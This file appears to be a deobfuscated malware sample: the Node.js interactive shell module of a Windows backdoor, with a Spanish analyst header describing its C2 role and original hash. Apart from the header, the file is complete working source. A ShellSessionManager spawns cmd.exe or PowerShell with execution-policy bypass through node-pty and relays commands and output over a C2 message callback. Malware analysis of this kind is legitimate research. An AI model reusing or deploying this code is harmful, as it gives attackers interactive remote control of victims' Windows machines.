/**
 * ============================================================================
 *  CHAINSCRIPT — Módulo Node.js de shell remoto (VERSIÓN RENOMBRADA)
 * ============================================================================
 *  Original : 2d47e303a6c278097ead4e6a754edf1a860ed7587f37e228bcea59eb7092f7a7
 *  Tipo     : Backdoor / implant de C2 en Node.js (Windows)
 *
 *  COMPORTAMIENTO:
 *    Implementa un gestor de sesiones de shell interactivo (ShellSessionManager)
 *    pensado para integrarse en un canal de C2 (WebSocket u otro). Recibe
 *    mensajes {sessionId, action} y:
 *      - 'start'  : abre un cmd.exe o powershell.exe via node-pty (ConPTY).
 *      - 'input'  : escribe datos en el shell.
 *      - 'resize' : cambia el tamano de la terminal.
 *      - 'close'  : mata la sesion.
 *    El shell se lanza con powershell en modo evasivo:
 *      -NoLogo -NoProfile -ExecutionPolicy Bypass
 *    y la salida se reenvia por el callback de mensajes (type: 'shell').
 *
 *    => Es el componente "shell" de un RAT/backdoor de C2: permite ejecutar
 *       comandos remotos de forma interactiva (reverse shell / web shell).
 *
 *  OFUSCACION ORIGINAL:
 *    - Identificadores con prefijo _0x8efc5822ecNN (nombres hexadecimales).
 *    - La clase y los metodos ya estaban legibles (ShellSessionManager).
 * ============================================================================
 */

const os = require('os');
const path = require('path');

let ptyModule = null;

// Carga diferida de node-pty (biblioteca de pseudo-terminal).
function getPty() {
    if (!ptyModule) {
        try {
            ptyModule = require('node-pty');
        } catch (err) {
            throw new Error(`node-pty not available (${err.message}). Redeploy with a new build.`);
        }
    }
    return ptyModule;
}

// Construye el entorno de proceso apuntando a la instalación de Windows.
function buildEnvironment() {
    const windowsDir = process.env.SystemRoot || process.env.WINDIR || 'C:\\Windows';
    return {
        ...process.env,
        SystemRoot: windowsDir,
        WINDIR: windowsDir,
        ComSpec: process.env.ComSpec || path.join(windowsDir, 'System32', 'cmd.exe'),
        PATHEXT: process.env.PATHEXT || '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC',
    };
}

// Devuelve el ejecutable y los argumentos según el tipo de shell pedido.
function getShellSpec(shellType) {
    const windowsDir = process.env.SystemRoot || process.env.WINDIR || 'C:\\Windows';
    if (shellType === 'powershell') {
        return {
            file: path.join(windowsDir, 'System32', 'WindowsPowerShell', 'v1.0', 'powershell.exe'),
            args: ['-NoLogo', '-NoProfile', '-ExecutionPolicy', 'Bypass'],
        };
    }
    return {
        file: path.join(windowsDir, 'System32', 'cmd.exe'),
        args: [],
    };
}

// Abre un proceso de shell con node-pty (ConPTY en Windows).
function spawnShell(pty, file, args, cols, rows) {
    const options = {
        name: 'xterm-256color',
        cols: Math.max(cols || 120, 20),
        rows: Math.max(rows || 30, 5),
        cwd: process.env.USERPROFILE || os.homedir(),
        env: buildEnvironment(),
    };

    try {
        return pty.spawn(file, args, { ...options, useConpty: true });
    } catch {
        return pty.spawn(file, args, { ...options, useConpty: false });
    }
}

// Gestor de sesiones de shell remoto.
class ShellSessionManager {
    constructor(sendFn) {
        this.send = sendFn;          // callback para enviar mensajes al C2
        this.sessions = new Map();    // sessionId -> proceso pty
    }

    handleMessage(message) {
        const { sessionId, action } = message;
        if (!sessionId) return;

        switch (action) {
            case 'start':
                this.start(sessionId, message.shellType, message.cols, message.rows);
                break;
            case 'input':
                this.input(sessionId, message.data);
                break;
            case 'resize':
                this.resize(sessionId, message.cols, message.rows);
                break;
            case 'close':
                this.close(sessionId);
                break;
            default:
                break;
        }
    }

    start(sessionId, shellType, cols, rows) {
        this.close(sessionId); // reemplaza la sesion anterior

        const { file, args } = getShellSpec(shellType);

        try {
            const pty = getPty();
            const proc = spawnShell(pty, file, args, cols, rows);

            proc.onData((data) => {
                this.send({ type: 'shell', sessionId, action: 'output', data });
            });

            proc.onExit(({ exitCode }) => {
                this.sessions.delete(sessionId);
                this.send({ type: 'shell', sessionId, action: 'exit', exitCode: exitCode ?? 0 });
            });

            this.sessions.set(sessionId, proc);
            this.send({ type: 'shell', sessionId, action: 'started' });
        } catch (err) {
            this.send({ type: 'shell', sessionId, action: 'error', error: err.message });
        }
    }

    input(sessionId, data) {
        const proc = this.sessions.get(sessionId);
        if (proc && typeof data === 'string') {
            proc.write(data);
        }
    }

    resize(sessionId, cols, rows) {
        const proc = this.sessions.get(sessionId);
        if (proc && cols > 0 && rows > 0) {
            try {
                proc.resize(cols, rows);
            } catch {
                // ignorar errores de resize durante el arranque
            }
        }
    }

    close(sessionId) {
        const proc = this.sessions.get(sessionId);
        if (!proc) return;
        this.sessions.delete(sessionId);
        try {
            proc.kill();
        } catch {
            // ignorar errores de kill
        }
    }

    closeAll() {
        for (const sessionId of [...this.sessions.keys()]) {
            this.close(sessionId);
        }
    }
}

module.exports = { ShellSessionManager };
